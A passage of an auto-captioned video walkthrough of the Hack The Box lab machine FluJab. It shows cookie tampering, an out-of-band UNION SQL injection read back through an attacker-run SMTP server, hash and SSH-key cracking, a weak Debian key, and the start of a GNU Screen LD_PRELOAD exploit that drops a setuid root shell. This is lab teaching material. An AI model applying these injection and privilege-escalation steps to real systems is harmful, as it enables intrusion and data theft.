 what's going on YouTube the zipsak me doing flu jab from hack the box which was a really fun but extremely difficult machine the two main reasons it was difficult is the first one being the creator didn't want it to be intuitive and how to progress through it he wanted to kind of be like the real world where there's a bunch of noise to filter through so there's a bunch of just stuff on this box 2:30 off the track I can't explain all the rabbit holes because this video would be like 20 hours long but I will show tips and tricks along the way like using aqua tone to take screenshots of a bunch of pages at once so you can filter through them pretty quickly the second reason this box is difficult is because the SQL injection is an out-of-band injection you have to modify the SMTP server to point at your box because the output of the SQL injection will come at you in the form of an email so that is a little bit difficult to do but it is relatively straightforward once you know how it all works which I'll do my best to explain after that the box is relatively simple to get a show on there's two different ways we'll show them both the second way I show at the end of the video is my favorite because it's taking a web application reading the API and using functionality and the API that's not in the GUI to do unintended things so that is a really cool thing and then the root of the box is just a simple screen exploit and it kind of fits the whole storyline of the box of a flu vaccination and the probe ask is a screening so with that being said let's jump in like every other box we begin with the N map with dash SC for default scripts SV enumerate versions Oh a output all formats but in the end map directory and call it flu jab and then the IP address which is 10 10 10 1:24 does take some time to run so I've already ran it looked into the results we have quite a bit of information here the first thing I noticed is SSH is open and but it doesn't have any type of banner so I'm going to do is open up a new pane or window whatever this is called and do SSH 10 10 10 1:24 and see what happens the next thing we have is HTTP is on port 80 it is a 301 redirect and it's location is the HTTP version of the website and it's saying it is clown where proxy and back on SSH we just get SSH exchange identification connection reset by Pierre so let's go over there and copy this and then go over and cherry tree and just create node of it so control shift and to create a child node label it interesting and we'll say SSH open but there is a filter so most likely there is something we can do on this box that will allow us to SSH we're not even getting like a public key denied error message so we don't have anything with that the SSH it just closes us right away so the next thing we have is HTTPS is open on port 443 the server header just like on port 80 is clown we're proxy the HTTP HTTP title is direct IP access not allowed and we have a ton of DNS names on this SSL certificate so that is something to keep mind of and there's nothing really interesting other than that we have a port 8080 that is open looks like the same thing as 443 with direct IP x that's not allowed and a bunch of dns names so let's go check out that web page so let's go to Firefox 10 10 10 1:24 except the SSL cert add exception if you wanted to you could do view details will get subject alternate names and get all the names you saw in that end map so confirm security exception and we just get a weird error message and this is looking like a like CloudFlare ripoff so I'm guessing we have to do various host names so let's go over to terminal and we will copy all these DNS things and then we'll do said we'll do echo based all the host names and then we can do said then search comma space DNS : replace it with just a space and do G and then we have everything spaced out correctly so I can copy this go on an Etsy house we can create an entry for 10 10 10 1:24 and then paste all this I don't want this wildcard so I'm just going to remove it from my host file and there you have it we have a bunch of host names the big pain now would be going to each of these and then viewing what is on the page so we went to like clown where dot HTP I think is one of them and we have to click through this as a zelcer a bunch of times to see what's on all the pages so I'm not gonna do that and we're gonna create a host file and take screenshots of all these pages so let's do VI host text paste this in : % s search for space replace with a return which is backslash R and now we have a line for everything and then I want to also add HTTP before it so I'm going to do QA to go in recording mode I to go in insert mode do HTTP s and then escape to exit that and cue to end my macro and now if I do at a it does that and we have about that looks like nine lines I'm gonna do nine at a and now we got four lines left so for a day so now everything has HTTP before it so let us install aqua tone so let's do github aqua tone and I just use this program for doing screenshots I found out about it because of a program called NAT less we searched NatWest github by 0x dade on github yeah there is Oh a stayed but this is like a open-source version of show Dan so really cool but let's go to CD / opt get clone aquatune and then let's just do the pre compiled package because I don't want to compile it so let's just download this aqua tome Linux AMD 64 save file move downloads aqua tone here and then we'll do unzip and unzip everything it looks like we have dot slash opportune there we go do we have chromium installed I do if you don't have chromium you can do apt install chromium see if it's updated sure let's install this now that chromium is installed let's just do a symbolic link yeah and opt aqua tone aqua tone I would do usual local been aqua tone and now when we go into HD boxes flu jab we can do cat host txt pipe it over to aqua tone and this will automatically capture screenshots using chromium of all these pages and then group it together in a nice HTML report so let's open up find out while that happens what files on Linux come on and then we want to go to root HT be flu jab or its boxes flu jab go over into HTML on that HTML we'll just wait for this to finish and then we'll create the report we could go in to screenshots and if we change this order into this well we can get snippets this way but we should have this aquatune report HTML and now we can close this window and we get a nice-looking report so floral design free flu jab HDB best med supply dot h DB smtp and then bunch of websites that look like trolls CloudFlare redirects if we go show more does that work doesn't look like it does click here there we go sister flu job HB and proxy is still like that we have more huh mostly that report came pretty janky but let's go to ones that look interesting let's check out best med supplied h TB so let's click through this warning click that exception confirm and then we click I or info we're getting a error message right now we got redirected to Klan way HB and we get an annoying page so let's exit out of that and let's check out a another thing so free flu jab htb visit the page click through the cert warning so we can close out of Aqua town because we probably don't need that anymore and let's take a look at this page so I focused in on free flu jab htb because well the box is called flu jab so kind of makes sense to focus here we have link PHP what does this do just another looks like controlling page so let's send this over into but make sure burp is not on intercept and the reason why I'm doing this is just so it logs all the pages we go to because if I ever get stuck I like going over to burp go to the target tab and I can just click here and look at various pages so we have booked cancel home info registration remind and stats so let's go flu stats I'm guessing is the stats yes it is and go look at this scrolling around tons of just reading and then we have some testimonials so potential names of users so let's go over do Cherrytree go up here we can call this free flu jab HDB and then do users and we have a Chun B Smith L something for gola maybe and then Jay Walker and this is on this page okay so let's see what else we have here we go back over to burp we don't really have anything new we have booked cancel home and for registration that we should view and these are in light gray which means we haven't viewed them black means we have so let's go all the way back to the top of the page go to patients register and we get a new patient registration form so date of birth let's just do a 401 410 and 1980 whoa 1 9 8 58 sure first name please last name subscribe NHS number we don't know that be subscribe at blue dot-com or we can do example.com I don't think that goes anywhere phone number five five five five five five five five five five eight six seven five I forget that song let's just go back to 5 4 5 1 2 3 4 8 6 75 309 that's what it was but we get must match a valid UK phone number so 0 1 2 7 2 then 3 to 8 so 0 1 2 7 2 3 4 5 6 7 8 click register and we get could not connect to mail server at port 25 so nothing really interesting there if we go to patients booking see what we can do here for a date that's fine first name was please last name was subscribe let's request an appointment please subscribe is not a registered patient so let's do go to cherry tree we have H on B Smith L something jaywalker so let's see if we can do Johnny Walker so Johnny Walker see it registered no he is not let's do John Walker and we get Eric could not connect a mail server so have a valid patient but wasn't able to do anything so let's go over the patient's cancellation and I may throw these into something like SQL map as I keep going but in sake of time I'm not worrying about that so this more tab gives the stats this goes to info and just before I click that it will top here and we had an error message not registered so if we went here inflation not registered right off the bat so let's go intercept the request to see exactly how it knows we're not registered refresh the page go to burp send it to repeater and we have two things we have patient and this looks like 32 characters so probably md5sum so if we echo - n WC - see 32 characters and it's in hex so most likely md5sum this looks like base64 so let's go to the decoder tab let's just do smart - code on URL that decode this as base64 and we get md5 sum null if we look at repeater tab one two two six nine six one two two six nine six so this is the patient number is equal to null let's say instead of null let's do true and then encode this as base64 and the last two a percent 3d still so we can just copy this and then we will go a register it is and paste up to the % - BD click go and we're no longer getting that redirect it says 200 ok oh wait 1 error not registered what was the page good a target it is probably cancel so let's go to get question bar / cancel and see what happens still a 200 okay and something weird includes fortune about PHP Pass Hamlet PHP but something odd let's open this source and Firefox and we can get a better picture of it so what I'm going to do is instead of just editing this every single time I'm gonna go to Firefox press I think f12 to open up the developer console go to storage and then go to this registered cookie and we can just edit this to be what we want so now we're cookie is saved we can close this and probably enough when I was in there I saw a cookie I did not see in the request we have this mod u.s. cookie and SMTP underscore config sums I take note of but now I want to go to cancellation we can turn in a set-off we get the page to cancel an appointment so it says NHS number required if we put something in it gives us the format of the NHS number so that was NHS - 3 characters to be characters for characters so NHS - 0 0 0 - 1 1 1 - 1 2 3 4 cancel appointment and we get error cannot connect to mail server at port 25 so going back into burp let's go to a target tab we have a lot more pages but nothing really new I'm going to guess question mark login because we had that register pages not a registered user so there's got to be a place to login I don't see it here we could run it through go Buster but I could also just guess the pages whoops login and see what we get right away to logout so let's examine what this redirect request looks like so if we do well again get a burp suite intercept go back to burp Santa repeater click go let's see it is sending us to 302 found set cookie this mod us and the path is SMTP underscore config so we had a bunch of airs on mail server and we have a SMTP config so it makes sense to poke at that next so let's copy this click go go here and look at SMTP underscore config and we get a denied so let's open up intercept and you get what we're doing here so we got this registered cookie that I think is still the same one we want it to end in zq because ba is null so zq if we go to proxy zq so this is still a modified cookie this one is not though so let's see what this equals and it's only got one percent 3d so i'm gonna erase this one paste it decode as base64 and we get configure equals null let's change that to true and then of course encoded in base64 it still just got one equal so instead of converting that i'm just going to copy this will go into the proxy tab and paste this and then click forward let me get mailer configuration so what i'm going to do is f12 and edit this cookie and firefox okay and we get patient email a configuration setting current setting is SMTP : 25 let's see if we can change this to or IP so 10 10 10 go to terminal if config eat 0 ton 0 10 10 14 and 3 so let's do 10 10 14 3 click Save it must match a domain name we could put a main name here and then intercept in and change it or we could just look at the JavaScript so press f12 go over to inspector going to click this little pick an element click here and we can see what the pattern is SMTP dot something dot something so I just double click this highlight the pattern escape it enter we have now just changed the requirement of the page and we can just save this config so now we have the SMTP setting at 10:00 1014 3.25 and then we have this only whitelist is this admin or authorized to access page so let's see what whitelist says and we get denied so let's go back go over to Burt intercept dawn let's see what the request to whitelist page looks like we have patient registered we're not sending that mod us so let's go back to firefox and changed the domain for it so it sends it on on the request because the path is to only SMTP config so the reason I'm doing this is because there's the only other cookie I know of so it's just a shot in the dark let us go back to Burt we can redo intercept and now go back try this again but let's intercept the request and we did send it so go over to repeater is it gonna redirect us to denied it is but this looks like it changed back to normal which is annoying so it's control C decoder well we don't even have to we got GW right here the good one we want is W you bigger the proxy tab it's like that so let's go over to a repeater decoder copy the configure a goes true one and see if we did this if it would fix it so let's go here paste go and now we get a 200 ok so that is definitely the issue we can see allow 10 10 14 3 so what I do in this case is I'd probably go in to put options and match and replace we want a request header we want to match the bad one so let's go back to Decatur cancel decoder let's just copy both of these so this is like this and then go to a proxy match or a place request header and we'll match on place and burp automatically so this will be mod US cookie click OK so now burp will automatically do that replacement for us so let's try this again so let's go to SMTP config and we get denied so I screwed something up no big surprise go to history look at this GW and again we want the W so what did I do go to options request data search for that replace with this why did that not go request body I don't think that would be it Barty doesn't make much sense but we'll try it click go denied so it's definitely going to be request header oh I have a space so I deleted the space and then clicked here which then put the space back in so I clicked back up there so now we don't have a space that was an annoying bug so let's go here SMTP config and now automatically searched and replaced if we go into a history tab go here we can see the auto modified request so we'll get mod u.s. GW Auto modified to W you and now if we go to wait-listed we have the whale ten ten fourteen three so now let's try to go over to patients let's see then do booking and it was what John Walker and then we need to do Matt cat LVN p25 click request appointment go back to terminal we get a connect but we don't see any data and that's because our SMTP server or what's listening on port 25 isn't sending the right stuff so let's do Python - M SMTP D dash n dash C debugging server 25 and this is just like simple HTTP server except it's gonna be for SMTP so mail error following address failed try to email so let's go back here john walker terminal and we get an email so looks like it's scrolling down we got too much information so we got this ref and then vaccination information so at least we know what a valid NHS number is so let's go over here oh that also gave me a JavaScript pop-up of the email of John Walker so that's interesting let's do cancellation and HS number cancel appointment and see what this sends if flu jab appointment has been cancelled have a nice stay and essentially the same thing we got the header of the email and whatnot the most interesting thing I see here though is a PHP mailer version so let's just go over to exploit DB or search boy PHP mailer and the version was five to twenty two and it doesn't look like it is vulnerable because we don't have any versions here so moving on to what else we could try we can try doing like SQL injections so let's go back into the page and let's do this NHS go to burp intercept on cancel appointment send this to repeater and let's try NHS and then a single quote well let's do what a valid response is real quick click go we get five three six six bytes do a single quote click go we get four six three three so we definitely have something here so let's actually see what this looks like so before I edit and send take a look at what this page looks like add that bad quote and nothing really different so I'm guessing the thing you get back is probably some type of JavaScript I'm going to look telling you appointments been cancelled so let's see if we go back into repeater let's add a comment which is - - plus - or data - dashes and then a space is a comment so click go and we get that five thousand bytes again so right off the bat I'm thinking we have SQL injection because it made that comment so let's try plus or 1 equals 1 and then a comment or we want we can probably get rid of this NHS number if I had left this in we'd probably have to do an end because this is true and then this would be true if that makes sense I want this left side to be false so the or equal 1 equals 1 will translate to a success so click go we get the 5,000 bytes so let's try or 1 equals 2 and we get 5 thousand bytes again so that is odd let's try 1 equals 3 come on five thousand bytes that's not right get rid of NHS completely click go maybe I was wrong there let's do a valid invalid thing so we're still getting five thousand bytes so not sure what happened the demo gods that's what happened so this click go five three seven five click go five three seven two five three seven eight so something changes a message successfully sent and we get this cow so if we do one see we get message Scruffy's successful sent let's click or a cool so it looks like that maybe some type of random saying that cow Redis and we're also getting successfully sent so that's annoying if we go to this terminal tab we see this referral is nothing right now and we put a valid NHS number we do get a referral so that is how we can identify bad requests versus good requests so do that no referral so now we have some type of boolean we can't use this page because of this thing that just keeps changing the bytes that I guess I missed so let's do single quote plus or 1 equals 1 and then a comment click go and we get a reference number so let's do or 1 equals 2 and we don't so there we have it we have boolean injection right there and that's proof so if the SQL can pull a valid reference number from the database it puts it in the subject if it can't it will still create the email but it just won't put a reference number if that makes sense so let's do burp and try a union select so Union select and we can type this without HTML encoding first so Union select 1 and then the comment highlight everything control you to HTML and code click go and did we get anything looks like we have that but nothing really changed oh no we haven't got the email it's not even sending the email right now you're in select comma to click go because we should have this reference change so something happened let's go to SMTP config and see if we're still pointed at the right spot we can turn proxy on still configured a mail to us but we're not getting any response it still set that or one equals one so maybe if the SQL command error is out and it's unsuccessful then it doesn't send the email so let's just keep going on with this Union ejection and see if we can figure it out equals three click go nothing for nothing five and we get an email back so we can see our SQL command here and then this reference is three so this third spot we can control so if we put a please subscribe here click go we have the reference is equal to that so instead of putting a string we can just do like version click go and we can get the my sequel version so we have a relatively good way to do data X fell out of this database so let's begin looking at the tables actually before we do that let's instead create a Python script to make this output a bit prettier because right now if we do it we'd have to keep doing a bunch of all tabs and then we'd also have to work in this burp window which has HTML encoding which makes this just overall hard to read so let's do a Python script to make this all easy so let's we can exit this when but let's do V cancel appointment PI and we'll have to start the script so first we'll do from SMTP D import SMTP server and we can go over to Firefox let's turn intercept off so we can google it is off and we can say SMTP server you do a bunch of googling for how to do this but there is a process message thing that gives you how to do this so you just be reading these Python documents to learn how this server works so if we do that we'll need now a class email server SMTP server and now we can define this message process message self peer mail from our CP TOS data kW args and I think it has all this it doesn't have that kW args here but this is the Python to documentation if I go to the Python 3 I think it will yeah so this is the one I'm doing it with and then debugging server this was that - C so if I did - C and just specified SMTP server it would have worked but wouldn't have given us the output the debugging server does that that's way too - C debugging server and it says arguments a per messages will be discarded and printed to standard out so if you read all the documentation it explains how this works but okay in this class defining process message so we can redirect redefine exactly how it processes messages so response is equal to data and we need that should be fine and then we can print data and then we need to get out of here deaf male and then email server 2008 when t5 this is what to listen on and then for some reason it has a remote host this is for forwarding things so if we look at this documentation SMTP server local address remote address if you search with Monroe dress remote addresses it is an address to Ford mail to if you want this to be like a relay server so nun says don't forward and then we need not sure if we need the async core loop yeah let's do that a sink core and we have to import this so import pacing core and we'll also do input threading so now we can do threads and then T is equal to threading thread target is equal to mail mail is this function threads dot end and the reason why I'm doing threads and all this is because not only do we have to be able to read email we have to be able to send messages so this is skeleton exploit to start that so now we can do while true CMD is equal to input please subscribe and then we will print CMD that's fine so if we do Python 3 cancel appointment we do test does that if we receive an email is it going to print the message it is there's a Python 3 so it's gonna be encoded by bytes by default so let's fix that by saying respond is equal to string and utf-8 so start this click go okay we got did they do what we wanted to do I don't think so response oh there we go go there we go so now we're printing this message so let's do a search of a place for this so let's import our efore regular expressions and now we can do data is equal to or a dot find all and then - what is it I think it was - space ref and we want to match everything like that we need to say we're searching response and grabbing the very first match so what this is gonna do it is going to take the variable response and search for this string and then the very first match is gonna be what's between these parentheses so now we can print instead of response we can print data go here click go and we print the database so that's good let's just print a blank line so it's a bit cleaner okay so let's see what do we do now we have to make a inject loop but before I do that let's improve this little looping thing because right now if I do something I don't have this up arrow and I don't have left and right so or make it a big pain to type in the future so let's do import CMD from CMD I think and we can do class terminal object I think prompt is equal to please subscribe and then we need was it do or just def default and I think that's self hugs print hugs I hope that's right and now we can do T is equal to terminal and then we'll call it term and term dot CMD loop I think that's how you use this module Python three we need from not from input from CMD important CMD I think I said right terminal has no object CMD loop let's see is it CMD line Python CMD loop terminal so we can find this module real quick let's see CMD module where is the input statement from CMD let's just try oh I see it this is Mosby object this is supposed to be CMD there we go if we type stuff we got that working so now let's do a definition for inject self args and this is going to be the Python request module so let's do payload is equal to F and then what do eggs I don't need the triple quote I do triple quotes by habit because then you can do double quotes without it breaking out of things but it should be fine eggs like that and now if we print a return payload and we call this stuff dot and checked hogs if I don't screw that casing up see if this works we need a print print there we go so now we have SQL so let's do import quests and make this inject actually send a request so data is gonna be the post data is equal to go to birth grab all these cookies oh no the first date I said let's grab this for now put a comment data and HS num is equal to this is going to be payload and then submit is equal to cancel appointment okay that should be fine now we need cookies and this is gonna do a similar thing let's go over to Decatur smart decode copy and then let's actually just paste it in and edit it so cookies is equal to patient then this md5sum then registered at base 64 then mod us like that I think that's good and now we just need our is equal to request dot post HTTP free flu jab HD b / cancel and then data is equal to data to send that cookies is equal to cookies to send that and i think we need verify is equal to false and that's SSL verification so we don't need to do that you don't need a print we can just inject args python 3 and let's do Union select one to please subscribe three four five inject not defined this needs to be self and we will have this print a debug statement of payload Union select one to please sub for five and we have the server respond to us with please sub we have this annoying banner and we can see this the actual payload we sent to the server so if I type in this Union select and put it in between all the needed things to do or sequel query so let's do Python three requests ignore SSL hide warning let's see here we go from a quest put that here and I'm not sure if I have to do anything I do we need to go down here and does this have like a request dot packages there we go this is the syntax I want paste run this and let's just scroll up to copy what we wanted so let's copy this paste and working perfectly so let's just take out this one statement we did for debug so it's no longer putting back to us and now if we do version it's good the only thing I don't like is the blank line before the output so let's go to the process message and move that down paste and there we go now that's perfect so we can do version and we get that so now we have to actually export information out of this database and the first thing we need to know is the actual database names so my sequel has this information schema table so this holds all the information about how all the databases and tables are organized so it makes a really handy thing to do SQL injection with I always go back to this page on how to do it so the first table I want to look at is schemata so if we look at the structure of this we have a schema name in this table so let's do the Union injection we had before and we want to put the table name here so there's gonna be schema name and then over here we want oh we need group 10 cat so this will take multiple results and then just display them all so and between them I want to put a comma so from information schema dot schemata click go or hit enter to go and we have all the tables we have med staff information schema and it doesn't look like it looks like we don't need this comma looks like by default this group concat separates by comma so we got med staff information schema my sequel openmrs PHP list and vaccinations so let's go over to cherry tree and create a new child object to do SQL dumping and we can do databases and we have what's just copy and then put them all so three tables I know a default or is this performance schema my sequel and information schema so I'm not really too concerned about them I'm concerned about these top four so let's do another query to dump the table names out of each of these so we can do group can cat instead of schema name let's go back and go into the tables where is it come on there we go information schema tables table and we can look we got table name and it's also got table schema so we can do group can cat table underscore name comma colon table underscore actually let's do scheme I first and then table name from information schema dot tables where table schema is equal to med staff if I do and do this it's probably be too many tables because of this information schema and my sequel table and performance so that's why I'm doing it this way I don't know why I decided to do this group can cat with table schema if I'm selecting the schema here but we did it so let's go here cherry tree I guess it makes sense when we do this tables it's gonna be a pain to highlight in reality I'd have the font like this but for videos we have it all the way up here so let's go back to terminal and we can do what table schema is equal to the next one which is open at mrs and you get o p en s I think I type out that let's see what table schema is equal to this oh let's it up a few times go back to this same command that works Union select group and carrot table schema table name from open NMR s so maybe that table we can't read so lets or that schema look at them again we can try PHP list so maybe it's this error message if we can't read it or maybe it just has too many tables the outputs too big so let's see we can verify that by shrinking the output of our command so was that open at mrs let's only do table names because I'm sure there's some limit to the amount of information you can put in the subject line and we may have hit that maybe not we'll just move on so the last table is vaccinations and that's a table we need today type type in this what is some failing table schema vaccinations this is weird here table schema there we go so yeah it must be just too much input because if we had this table schema table name we get error message so it must be maximum of four characters you can put so you may have to break these in multiple requests and do like a substring query and export it that way so this table below table is vaccinations so let's see to save time instead of dumping all of these I'm going to just focus on the vaccination table which I know is beneficial and I don't feel like separating all this let's just see what's in this admin table so going back here you can guess it there's another thing to go to columns so if we do columns we can do information schema column stable and we got table name column name table schema so go back here a group can cat is going to be column name from information schema dot columns where table schema is vaccinations and table name is admin let's try this there we go we have the vaccination stable information so vaccinations admin and I have a better way to do this the temp paced person s comma backslash ER and whoops it was G paste percent ass Tama that's not sure G okay and then hate copying in visual mode and VI I think it's the highlight plus nope let's just save cat temp and copy so let's see let's get let's even get all these tables so we can copy this again go up and we'll do group can cat paste and after each of these tables we can see there's a better way to do this there's always a better way go back into VI paste % s replace comma with a comma then colon comma that looks good okay damn there we go that's not what I want to do and they command aired let's just do this column name for mr. game yes let's just select all these oh I know what I did wrong so we have this with all of the things we're no longer in information schema we're in vaccinations dot admin is it case sensitive I think this is right let's just select ID from vaccinations dot admin there we go so I want to Fitz case sensitive or maybe there's a type of there that just oblivious tail so it doesn't like all of this so let's do ID we can do the next one which is login name this ADM so let's see if I copy everything without this will it work we go up here or is it this paste nope so it's Joe my guess one at time not sure why this isn't working I wonder if there's one of these columns we don't have permission to or something well your name sysadmin next thing is named Elsie and we have administrator then we have email fluid jabbed at HDPE access and we get another hostname so let's do ID 0 root name sis a DM named Elsie was administrator email sis a DM at flu jab HT b access is this dns name let's do created so these are dated timestamps i'm not going to worry about them password and we get this so I'm going to stop copying all this because it'd be a waste of time but let's see what this password is so we can go down here echo - n paste that WC - C 64 characters so let's see do we have hash identifier or something hash trash identifier paste paste so list of possible hashes sha-256 so that's probably gonna be the it's likely out of all this it's kind of what I am most familiar with let me do hashes org is it Brooklyn intercept and it's not let's see if we can search this we could use hash cat but this would be a bit quicker BTK DDJ six and it is not in here so I guess we'll have to move over to hash cat so let's go to my cracking machine because I hate cracking in a VM so let's go CD hash cat we can type the dict V hashes we'll call this flu jab - sha-256 paste it we do dot slash hash cat example for Matt I think formats hash cat help got - I example example hashes rap - I saw and let's see with sha-256 is so let's see there it is so we can do less search for this and it is mode 1400 so let's do dot slash hash cat - em 1400 hashes flu jab and opt word list rocky text and let's see if this cracks and almost instantly we get it as the doctor so let's go back over to cherry tree and we can do password the doctor and then put in parentheses this so we have a new page sysadmin - console - oh one flu jab HDB so let's go in to be Etsy hosts and add this here and we can also go to like SMTP flu jab htb and try those credentials so SMTP flu jab htb and we can try sysadmin at flu jab HDB from email and the password has the doctor and it doesn't work if you look at the source code for this page it says it's now deprecated and all the integration is on the free service application so this page doesn't work but if we go to the new domain this will work hopefully so HTTP go here direct IP access is not allowed let's try port 8080 and we get access tonight so one of the annoying things about this box is this page requires access to that white list and that white list may have got erased so let's do free flu jab DHT b / smtp config denied oh my god why is it denied intercept on smtp config look at mod us W you I think this one was good maybe my registered cookie changed copy this two code base 64 the code as base 64 what to care did not copy I did not copy the whole thing that explains it q config is equal to true so let's try this registered thing maybe this cookie expires and it got set again so this is 2 equals decoded as base64 and is equal to null so let's do the same exact thing that we did on the previous one is set something to always set this cookie so request header match that click OK and then let's go into decoder change this to true and code as base64 and replace it add it based so now hopefully we can go to this SMTP config looks like we can click on wait-listed admins denied I'm guessing the mod us is not here so let's go back to Firefox one of something cleared this is weird go back to storage it should be sending mod us we still got that on path is equal but intercept on waitlist patient it's not something mod us let's go what is it should have an SMTP config okay request let's grab this go here paste it forward denied okay so what I'm going to do is I'm just going to add this again because we did this once before and it worked so instead of troubleshooting we're just going to assume if I edit this take this pattern out do ten ten fourteen three save it and we go to http sis admin console one port 8080 it's clear my cache maybe it's a cache thing clear history clear everything HTTP so d there port 8080 and there we go so I think I had to clear my cache but now we get to this a gentie login page so we can do sis admin and the password was the doctor and when we log in I could type the password correctly I think that's why I typed this ADM I think yeah well again we get a page hopefully so we get this application it looks like it is going a little slow is perp on intercept it is not click on plugins super-users required dashboard again it's loading there we go we can see the uptime of the box go to settings super users required notepad we go to open and we can do like at sea horse we can see it opens this file on the remote server so the first thing I did always try to go into route we can't let's try figure out what user we are so let's go to proc then self and I think it's environment I environed we get an error message so we can't view that file let's just go to home and we have a bunch of users so let's see what's in these files a user dot txt bash Darcy profile nothing that one nothing in this user just keep going and we have something in this user we have a dot SSH file so we got authorized keys and user key so let's do auto eyes keys and we have show whitelisting plus key off enabled so if we go back the shell interesting so we need SSH key but what connection reset by peer when we try to SSH in the box so we got shell whitelisting so if we go open Etsy and then let's try you just know how SH can be configured we have this host deny file and we can see sshd is blocked so if we go to Etsy and her start allow we can do shd ten ten fourteen three see if we can save this file we can and now if we try to Sh 10 10 10 122 will we get anything no route to host as the port is 124 or the IP is 124 connection reset pipe here let's just do all 10 10 14 3 save it try it again and we get a banner and then when we do we get immediate permission denied public key even if we tried like this ADM will probably get the same exact thing so let's go back into the home directory of dr. know where he had that authorized key file so we can grab ssh authorized keys not that one home dr. no Sh is this user key the private key looks like it is so let's copy this we can do make the doctor no NV private M paste it and then I think it's like SSH to John do we have it on kraken ssh to locate SSH to John what's the script locate SH - John there we go it's just not my path so we can copy this and then we want to put the private key file so this will be private DM copy this and then we can go back into the crack in C up John you do V root we'll do blue jab doctor no dot SSH paste down slash John root flu jab doctor notice H - - word list is equal to opt word list Brock you txt and we get the decryption password is shadow troll so if we try this key the first thing we have to do chmod - 600 and then SSH - I private Pam dr. know at 10 10 10 1 24 put the password of shadow troll and we still get permission denied so what we can do is SSH - I think key Jen - Y for yes - f4 file put this key paste and this will be the public key for this key so if we go open go in his home directory done ssh authorized keys we can see ma XE is how that ends this is not the key to this thing so i'm guessing this one key here is just a troll since the password included troll and the public keys don't match up so if you do this every time we can see whoops shadow troll it'll come out to the same thing so let's keep poking around the box let's see I want to go to Firefox we could go examine other home directories and there's two ways to get a shell from here we're going to do the first one we'll do the second one at the end of the video so the way I think most people probably did it was poke around the SSH config so if we go to at C s is HD or is it just SSH we get this deprecated keys directory and you'll be going here to look at this sshd config and then you can see exactly how it's used we got this authorized key file with a extra file here which will be handy later on so HD paste that but let's go check out that deprecated keys directory so that's C and SSH deprecating keys we've got a few keys we got this read me and says copies of compromised keys will be kept here for comparison until all staff have carried out Pam updates as surgery security notification email do not reuse any keys so there was some type of key compromise if we do open Etsy I think it's issue we can see this is a debian box so I just found this in the osep labs a long time ago and it kind of rang a bell so if we google SSH key compromise Debian I think we go to this repository from got milk and essentially see if he says the dates here Debian announced all SSL SSH keys generated on debian based systems between September 2016 and May 2008 may be affected so during that time Debian created a lot of weak SSH keys so let's clean this repository so get clone and then let us go here open what is it nope it's at sea up one that's see that's eh deprecated keys and you'd grab each of these keys I want to say from memory it is this key and I don't feel like going through that menu 100 times so we're gonna work under the assumption it is this key and then if it's not then what grab out the keys it's just a waste of time to grab them all so make sure I will do keys and V key dot Pub paste this and we want to do ssh-keygen - l - f I think for fingerprint key dot pub and we can see this is a sha-256 4096 bit so if we go into this repository if we do LS common keys we have Debian SSH DSA and RSA but 2048 and we're 4096 so we're not on any of the common keys let's go Debian SSH let's go to uncommon keys and we have 1 4096 so let's extract this tur that is BZ so I think that's J there we go we're extracting and then this looks like fingerprints are done and md5 because that looks like 32 characters it's certainly more than this so let's do ssh-keygen - l - think capital e md 5 - f key pub if I can type there we go so let's do said s : G and see if this key exists because I think this is the fingerprints so we go into RSA 4096 we can do fine dot grep for the fingerprint and there we go so we could keep pub and cat this pub oh I forgot the - two three - and we could see these are the same keys but the fingerprint did that for us so we can't this or instead of cat let's copy to HB boxes flu jab keys will call compromised dot m LS chmod 600 compromised p.m. and this will be dr. know at flu jab eh DB connection reset by peer so it looks like host out well file has to be set again so let's go to open let's see oh stop oh well and then we can do s HD ten tenten a tenten 14 3 and we're also wanted all I don't know which one of these it was when I've done both and that's when it worked there we go and now we are finally on the box so let's do ALS we got user detect if we do WCC user dot txt WC command not found echo path and we got user or Ben so it looks like we are now in restricted bash so if we do export path is equal to flash bin path is read-only so if we do double tab we can see commands we can do so let's try cat so cat @c passwd so we can cat files so let's see what are the commands do we have we went through all these and did a GTFO bins on them we should see I think make is here make is our command so you could do a Google search gtfo bins same thing as a little bins just for Linux if you just searched each of these and found make you'd see there's one worth of shell so you can just copy this paste copy the next line paste and now if we do PWD home dr. no WC - C user dot txt WC is not found export path is equal to let's do echo path doesn't make it equal to what - and now WC - C use that txt you got that so that's one way around this or a bash so we exit completely we can do another one so we can just do - T ash to force a terminal and I think we have to edit this host thing again so let's go save go come on save that's weird you can't SSH at all there we go so let's try that - tea again come on so is h-dr know at 10 10 10 1:24 - I compromised Pam and this is keys / compromised up Pam - tea bash because it's always - tea I don't know why this one's not working 10 10 10 1:24 weird but that - tea just like in other videos is a way to bypass it so we do echo path export path is equal to slash do echo path paste and it's not read-only so there's two ways out of that so I'm running low on time so I'm not going to do linen oom I'm just going to look at set UID binaries manually so let's do fine / - perm 4 7 5 5 PI pairs - dev null and let's see what we have so looking at this it's weird because this is not the normal path where screen is installed so if we do which screen we can see screen is user bin screen if we do LS la it is not a symlink so let's compare these two versions of screen and we see different version so these are different files much different sizes this one is much bigger than this so this leads me to believe it's statically compiled while this one is dynamically but if we do this screen - V we get screen version 4 0 5 if we do this grain - V wait huh I thought they'd be different versions D package - L grab screen 4 5 0 it says 4 0 5 0 not sure exactly what's going on there but these are definitely different binaries do md5sum on that and of course this one and they'd be different because you just see the file size difference so let's go search point screen to see what's here and we got gnu screen 4 5 0 so let's do search poit - M - mirror and then take a look at what this is with - X so we got two files first we create a shell and library then compile it and then go so let's see include stdio.h is creating two files Lib hacks dot C and temp root shell lip X is just the exploit and Lib hacks is just a set UID binary so it looks like we can do a LD preload attack against screen and have a sent UID binary execute alright give set UID binaries the permissions so let's try this let's see do we have GCC not found we have locate on this locate not found find slash grep GCC dollar - dev null so tight pipe two errors out Oh Ike I do it here - Dev null user Lib GCC user bin GCC echo path user Ben's not my path so we can do echo path export path is equal to path user bin GCC user bin GCC wait a second sorry directory that is so it's a dead symlink so let's just copy this on my local box so let's do a new directory bi 4 1 1 5 4 and let's just create these two files and then compile it manually so let's do copy make derp X boy CD X boy VI Lib hacks C set paste just cat 4 1 5 4 3 easier to copy so we can see this file paste so the drop shell is going to yeah do a CH own to own this to root which is zero zero and then do a chmod - four seven five five so this is definitely an LD preload just executing commands so we can save that and we can compile it so GCC - F pick shared LD L - o for out file web access sell my pack see there we go we got to the Lib hacks start s so file it's removing the source we want to worry about that we got a shell dropper so let's just copy this V root shell dot C set paste and then GCC - OH root shell and then the location root shell dot c LS okay so we have both of those compiled so let's see it does CD Etsy umask triple zero so this means files created will be CH model with seven seven seven because this is the inverse run screen with the binary and then I guess this echo command will append the temple impacts dot s oh so it actually gets loaded and when web hack start a so it gets 